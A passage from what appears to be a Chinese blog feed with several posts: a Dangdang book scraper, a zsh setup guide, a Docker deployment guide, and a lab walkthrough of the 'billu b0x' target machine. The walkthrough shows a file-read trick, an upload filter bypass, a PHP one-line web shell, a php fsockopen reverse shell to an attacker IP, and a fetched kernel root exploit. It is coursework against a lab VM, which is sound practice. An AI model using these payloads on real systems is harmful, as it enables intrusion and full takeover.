class="string">&quot;提示: 请从浏览器开发者工具中复制Cookie并保存到同目录的cookie.txt文件中&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="二、分析网页元素"><a href="#二、分析网页元素" class="headerlink" title="二、分析网页元素"></a>二、分析网页元素</h2><p>这步更简单，只需要分析网页结构即可<del>(剩下的交给ai)</del>。下面以爬某个商品的图片链接来说明：打开商品详情页面，对准商品图片按下鼠标右键，在选项框里选择“检查”，</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/2025-06-25%20181702.png" alt="检查"></p>
<p>然后在弹出的开发者工具中就会显示图片对应的网页结构，</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/dd74f6e7de8e2a17d0d90a7967218603.png" alt="图片网页结构"></p>
<p>从html文件中可以看到商品图片对应的模块是id为<code>largePic</code>的<code>img</code>块，我们可以给ai描述为“从id为largePic的img块中获取src的内容，并在链接前面添加‘https:’。”</p>
<p>获取链接的核心代码如下(使用了<code>BeautifulSoup</code>包)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">    src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">    product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>其余的相关信息也是依法炮制，比如要获取标题信息就对标题进行检查，要获取作者信息就对准作者信息进行检查，这里给出我获取的一些商品信息的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_product_info</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从商品页面提取详细信息&quot;&quot;&quot;</span></span><br><span class="line">    soup = <span class="variable language_">self</span>.fetch_page(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> soup:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 初始化商品信息字典</span></span><br><span class="line">    product_info = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;rate&quot;</span>: <span class="number">6</span>,  <span class="comment"># 根据要求默认为6</span></span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;specifications&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;作者&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;副标题&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;ISBN&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;帧装&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;页数&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版社&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版日期&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ①提取title</span></span><br><span class="line">    title_elem = soup.select_one(<span class="string">&#x27;div.name_info h1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> title_elem <span class="keyword">and</span> title_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        full_title = title_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="comment"># 确保full_title是字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(full_title, <span class="built_in">list</span>):</span><br><span class="line">            full_title = <span class="string">&#x27;&#x27;</span>.join(full_title)</span><br><span class="line">            <span class="comment"># 处理title，截取到第一个&#x27;（&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;（&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;（&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title</span><br><span class="line">    <span class="comment"># ②提取price</span></span><br><span class="line">    price_elem = soup.select_one(<span class="string">&#x27;p#dd-price&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> price_elem:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 提取数字部分</span></span><br><span class="line">            price_text = <span class="string">&#x27;&#x27;</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> price_elem.text <span class="keyword">if</span> c.isdigit() <span class="keyword">or</span> c == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            product_info[<span class="string">&quot;price&quot;</span>] = <span class="built_in">float</span>(price_text)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># ④提取description</span></span><br><span class="line">    desc_elem = soup.select_one(<span class="string">&#x27;span.head_title_name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> desc_elem <span class="keyword">and</span> desc_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        product_info[<span class="string">&quot;description&quot;</span>] = desc_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    <span class="comment"># ⑤提取cover</span></span><br><span class="line">    cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">        src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">        product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># ⑦提取作者、出版社、出版日期</span></span><br><span class="line">    messbox = soup.select_one(<span class="string">&#x27;div.messbox_info&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> messbox:</span><br><span class="line">        spans = messbox.select(<span class="string">&#x27;span&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">0</span>:</span><br><span class="line">            author_elem = spans[<span class="number">0</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> author_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">0</span>][<span class="string">&quot;value&quot;</span>] = author_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">1</span>:</span><br><span class="line">            publisher_elem = spans[<span class="number">1</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> publisher_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">5</span>][<span class="string">&quot;value&quot;</span>] = publisher_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">2</span>:</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">6</span>][<span class="string">&quot;value&quot;</span>] = spans[<span class="number">2</span>].text.split(<span class="string">&#x27;:&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="comment"># ⑨提取ISBN和帧装</span></span><br><span class="line">    key_ul = soup.select_one(<span class="string">&#x27;ul.key.clearfix&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_ul:</span><br><span class="line">        lis = key_ul.select(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">2</span>:  <span class="comment"># 第三个li为帧装</span></span><br><span class="line">            framing_text = lis[<span class="number">2</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">3</span>][<span class="string">&quot;value&quot;</span>] = framing_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">4</span>:  <span class="comment"># 第五个li为ISBN</span></span><br><span class="line">            isbn_text = lis[<span class="number">4</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">2</span>][<span class="string">&quot;value&quot;</span>] = isbn_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> product_info</span><br></pre></td></tr></table></figure>

<p>一点儿吐槽：<del>ai是真好用啊，感觉我不如ai一根。</del>当当网的网页结构是真的丑，甚至每本书各自的标签爬下来和主页的标签分类对不上，还要手动调整，也是被整无语了。</p>
]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh的安装和简单配置</title>
    <url>/post/88f7f195.html</url>
    <content><![CDATA[<p>写在前面：本教程使用的是WSL2(Debian系统)，使用ArchLinux系或者RedHat系的操作系统可能在下面的操作中有些许不同之处。zsh有比bash更加丰富的扩展功能，在可自定义化和补全功能上都比bash要强大很多<del>(最重要的是zsh比bash的prompt好看多了)</del>。</p>
<h2 id="一、下载zsh并设置其为默认shell"><a href="#一、下载zsh并设置其为默认shell" class="headerlink" title="一、下载zsh并设置其为默认shell"></a>一、下载zsh并设置其为默认shell</h2><ul>
<li>下载zsh<br>下载zsh非常之简单，很多版本的Linux都提供了zsh的预编译包，可以通过系统的包管理器安装。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure>

<p>如果你的Linux使用的是其他包管理工具，比如yum或是pacman，请自行查找教程。</p>
<ul>
<li><p>将zsh设置为默认shell<br>首先要检查zsh是否安装成功，输入命令<code>zsh --version</code>后如果有类似于下面的输出，那说明安装成功了。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/dd48fdedf7063619e1708387b1d60e71.png" alt="zsh-version"><br>之后就是输入命令让zsh成为默认shell。</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure></li>
</ul>
<p>至此，zsh的下载安装已经完毕。</p>
<h2 id="二、下载oh-my-zsh并进行插件和主题的配置"><a href="#二、下载oh-my-zsh并进行插件和主题的配置" class="headerlink" title="二、下载oh-my-zsh并进行插件和主题的配置"></a>二、下载oh-my-zsh并进行插件和主题的配置</h2><p>oh-my-zsh是一个开源的zsh配置管理框架，旨在帮助用户快速上手zsh，并通过丰富的插件和主题让命令行体验更加高效、美观和个性化。<del>(上述内容由ai生成)</del></p>
<ul>
<li><p>下载oh-my-zsh<br>如果你在国内，可以使用gitee的镜像</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>  如果你在国外或者就是想用github，使用以下命令：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>下载powerlevel10k<br>powerlevel10k是一个自定义化程度相当之高且方便使用的主题配置工具，和上面的一样，可以选择从github或者gitee来下载：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>

  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>

<p>  下载完毕之后，编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;主题名称&quot;</span><br><span class="line">#修改为：ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure>

<p>  保存并退出后执行命令<code>source ~/.zshrc</code>后会让你自定义prompt外观。<br>  如果你之后又想进行外观的修改，可以输入命令：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载两个常用插件<br>先编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(git) </span><br><span class="line">#修改为：plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure>

<p>  然后下载两个插件：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<p>  最后仍然是执行命令<code>source ~/.zshrc</code>使插件生效。</p>
</li>
</ul>
<p>以上就是zsh的安装和简单的配置，放一个我配置完的zsh的效果图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/95f4d3600abefc9525dc9d907f96f21f.png" alt="zsh-example"></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>教程</tag>
        <tag>zsh</tag>
        <tag>美化</tag>
      </tags>
  </entry>
  <entry>
    <title>网络攻防实战billu b0x打靶思路</title>
    <url>/post/b858f09.html</url>
    <content><![CDATA[<p>写在前面：思路不同于cy老师上课讲的，故在此记录一下。</p>
<h2 id="一、扫描端口"><a href="#一、扫描端口" class="headerlink" title="一、扫描端口"></a>一、扫描端口</h2><p>首先还是尝试非常经典的扫描端口，输入以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#查找靶机ip</span></span><br><span class="line">nmap -p- 10.0.2.13 -sV –min-rate 50000 –min-hostgroup 100 <span class="comment">#查找靶机暴露的端口以及其具体信息</span></span><br></pre></td></tr></table></figure>

<p>发现结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p>
<p>尝试寻找相应的漏洞后(使用<code>searchsploit</code>命令)，没有发现可利用的漏洞，故进行到下一步。</p>
<h2 id="二、尝试破解登录"><a href="#二、尝试破解登录" class="headerlink" title="二、尝试破解登录"></a>二、尝试破解登录</h2><ul>
<li>首先尝试使用seclist中提供的目录来进行爆破，但是因为burpsuite没开会员，等待时间非常长，故选择放弃。</li>
<li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li>
</ul>
<h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p>
<ul>
<li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p>
</li>
<li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p>
</li>
</ul>
<h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p>
<p>如果查看<code>/in</code>网页也没有太大关系，输入以下命令可以查看靶机的内核版本以及发行版版本等各详细信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release <span class="comment">#查看发行版版本等其他信息</span></span><br></pre></td></tr></table></figure>

<p>接下来的事情就比较简单了，输入以下命令来完成内核漏洞的爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在主机上：</span></span><br><span class="line">searchsploit privilege | grep 3.13 | grep linux <span class="comment">#查找可以利用的内核漏洞，发现编号为37292的文件</span></span><br><span class="line">searchsploit -m 37292 <span class="comment">#将该文件下载到本机</span></span><br><span class="line">python -m http.server:80 <span class="comment">#开启http服务方便靶机从主机下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在靶机上</span></span><br><span class="line"><span class="built_in">which</span> gcc <span class="comment">#检查运行环境，发现靶机有gcc工具，故不用管</span></span><br><span class="line">wget 10.0.2.11/37292.c <span class="comment">#从靶机上获取漏洞文件</span></span><br><span class="line">gcc 37292.c -o 37292 <span class="comment">#将.c文件编译链接为可执行文件</span></span><br><span class="line">./37292 <span class="comment">#执行文件来获得root权限</span></span><br></pre></td></tr></table></figure>

<p>结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>网络攻防</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>使用docker部署SpringBoot+Vue前后端分离项目</title>
    <url>/post/70e0611f.html</url>
    <content><![CDATA[<p>写在前面：致敬软院传奇专业核心课程软工二：大作业卷得飞起<del>(怎么有小组做了10个自由需求甚至做了CICD的啊)</del>，上课全在讲笑话期末考得一坨屎<del>(本fw期末喜提卷面68分)</del>。因为sb课程部署项目会加分，故有了这篇快速教学文章(文章不会涉及原理，只教如何使用工具)，希望能对学习部署的人有所帮助。</p>
<h2 id="一、下载docker"><a href="#一、下载docker" class="headerlink" title="一、下载docker"></a>一、下载docker</h2><ul>
<li><p>在你的云服务器上(一般都是选择ubuntu系统)执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io docker-buildx</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载完docker后因为docker的官方源需要梯子，所以要更换镜像源，进入<code>/etc/docker</code>文件夹并创建<code>daemon.json</code>文件，加入以下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>添加完毕之后输入<code>sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</code>命令重新启动docker，这一步之后输入<code>docker run hello-world</code>查看是否能够正常拉取镜像，结果应该如图所示：</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/dfe43bf78d3322e1e8d31d56f924d977.png" alt="拉取hello-world镜像"></p>
<p>至此，docker的安装已完成。</p>
<p>安装完成后可以先为你的项目创建一个网络，使用<code>docker network create your_network_name</code></p>
<h2 id="二、部署mysql"><a href="#二、部署mysql" class="headerlink" title="二、部署mysql"></a>二、部署mysql</h2><ul>
<li><p><code>mysql</code>的部署非常简单，输入以下命令即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name mysql --network your_network_name -p 3306:3306 \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=your_root_password -e MYSQL_DATABASE=your_database_name \</span><br><span class="line">  mysql:latest</span><br></pre></td></tr></table></figure></li>
</ul>
<p>然后再输入<code>docker ps</code>查看部署情况：</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/017639f4d7b60ceeedec7233fcd0061b.png" alt="017639f4d7b60ceeedec7233fcd0061b"></p>
<h2 id="三、部署后端"><a href="#三、部署后端" class="headerlink" title="三、部署后端"></a>三、部署后端</h2><ul>
<li>在部署后端之前，要先对后端项目进行打包，需要使用maven工具。下面以idea来做演示：</li>
</ul>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/5bc1b6124afb368fc6305922ff0882a1.png" alt="使用maven打包后端"></p>
<p>​		打包完成之后，在<code>target/</code>目录下会出现一个jar包，这个jar包就是我们部署后端需要的核心部件。</p>
<ul>
<li><p>创建<code>/opt/your_project_name/backend</code>目录来存放后端部署文件，将上面的jar包放入该文件夹，同时我们还需要后端运行的配置文件(<code>yaml</code>文件或者是<code>properties</code>文件)和<code>Dockerfile</code>部署文件。</p>
</li>
<li><p><code>application.yaml</code>(示例)文件如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://mysql:3306/smartpricing?characterEncoding=utf-8&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=Asia/Shanghai&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>​		注意这里的<code>url</code>不再是<code>mysql://localhost:3306</code>而是<code>mysql://mysql:3306</code>，也就是把主机名换成了你部署的<code>mysql</code>的容器名。</p>
<ul>
<li><p><code>Dockerfile</code>(示例)文件如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用官方的 OpenJDK 21 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/smart-pricing/backend</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 JAR 文件和 application.yml 复制到工作目录中</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> smart-pricing.jar ./smart-pricing.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> application.yml ./config/application.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置时区为上海</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露应用程序端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定容器启动时执行的命令，运行 Spring Boot 应用</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;java -Dspring.config.location=file:./config/application.yml -jar smart-pricing.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>​		因为本地后端配置和云服务器的后端配置文件不一样，所以需要指定选择配置文件来运行。</p>
<ul>
